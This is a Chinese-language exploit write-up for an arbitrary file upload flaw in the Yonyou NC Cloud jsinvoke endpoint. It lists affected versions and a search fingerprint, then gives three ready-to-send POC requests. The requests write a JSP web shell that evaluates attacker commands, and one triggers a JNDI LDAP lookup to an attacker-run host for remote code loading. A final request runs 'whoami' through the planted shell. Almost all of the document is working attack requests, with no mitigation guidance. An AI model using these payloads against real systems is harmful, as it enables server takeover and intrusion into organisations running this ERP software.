# 漏洞描述

用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限

app="用友-NC-Cloud"

# 影响版本

```
NC63、NC633、NC65NC Cloud1903、NC Cloud1909NC Cloud2005、NC Cloud2105、NC Cloud2111
```

POC1

```
POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
    "webapps/nc_web/407.jsp"
  ]
}
```

POC2

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host:
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}",
    "webapps/nc_web/301.jsp"
  ]
}
```

POC3

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 192.168.0.11:8089
Content-Length: 249
Accept: */*

{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/1ndex.jsp"]}
```

访问1ndex.jsp，命令执行成功！

 ```
 https://192.168.0.11:8089/1ndex.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream())
 ```



```
GET /1ndex.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) HTTP/1.1
Host: 192.168.0.11:8089
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

